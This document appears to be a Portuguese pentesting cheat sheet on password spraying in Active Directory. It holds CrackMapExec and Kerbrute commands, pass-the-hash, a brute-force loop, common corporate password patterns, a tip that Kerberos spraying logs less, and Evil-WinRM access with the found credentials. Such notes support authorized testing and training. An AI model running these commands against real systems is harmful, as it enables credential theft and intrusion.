# Password Spraying



## Antes de começar - verificar política de lockout

Nunca inicia spray sem checar a política de lockout do domínio. Lockout threshold igual a `None` significa sem bloqueio.

```bash
crackmapexec smb <DC_IP> -u <user> -p <pass> --pass-pol
```



## CrackMapExec - SMB

```bash
# Um usuário, wordlist de senhas
crackmapexec smb <IP> -u <user> -p wordlist.txt 2>/dev/null | grep "\[+\]"

# Lista de usuários, uma senha
crackmapexec smb <IP> -u users.txt -p 'Password123!' 2>/dev/null | grep "\[+\]"

# Lista de usuários, wordlist de senhas (com domínio)
crackmapexec smb <DC_IP> -u users.txt -p seasons.txt -d domain.local 2>/dev/null | grep "\[+\]"

# Autenticação local (não de domínio)
crackmapexec smb <IP> -u administrator -p wordlist.txt --local-auth 2>/dev/null | grep "\[+\]"

# Pass-the-Hash (quando signing=False)
crackmapexec smb <IP> -u user -H '<NTLM>' 2>/dev/null | grep "\[+\]"
```

---

## CrackMapExec - WinRM

```bash
crackmapexec winrm <IP> -u users.txt -p wordlist.txt -d domain.local 2>/dev/null | grep "\[+\]"
```

---

## Kerbrute - via Kerberos (porta 88)

Vantagem: autenticação Kerberos não gera o mesmo tipo de log que NTLM. Não causa lockout por padrão.

```bash
# Enumerar usuários válidos
kerbrute userenum --dc <DC_IP> -d domain.local users.txt

# Password spray
kerbrute passwordspray --dc <DC_IP> -d domain.local users.txt 'Password123!'
```

---

## Wordlists úteis por padrão

Senhas corporativas seguem padrões previsíveis. As que mais funcionam na prática:

- **Seasons:** `Winter2021!`, `Spring2022@`, `Summer2021?`, `Autumn2021?`
- **Months:** `January2022!`, `February2022!`
- **Padrões genéricos:** `Welcome1!`, `Password123!`, `Company123!`, `Change@Me1`

---

## Script para testar múltiplas combinações

```bash
for user in administrator richard kane jsmith; do
  for pass in 'Winter2021!' 'Spring2022@' 'pa55w0rd'; do
    result=$(crackmapexec smb <IP> -u "$user" -p "$pass" -d domain.local 2>/dev/null | grep "\[+\]")
    if [ ! -z "$result" ]; then echo "ENCONTRADO: $user:$pass"; fi
  done
done
```

---

## O que fazer com as credenciais encontradas

```bash
# Verifica nível de acesso
crackmapexec smb <IP> -u user -p 'senha' --shares
crackmapexec winrm <IP> -u user -p 'senha' -d domain.local

# Testa acesso via Evil-WinRM
evil-winrm -i <IP> -u user -p 'senha'
```

---



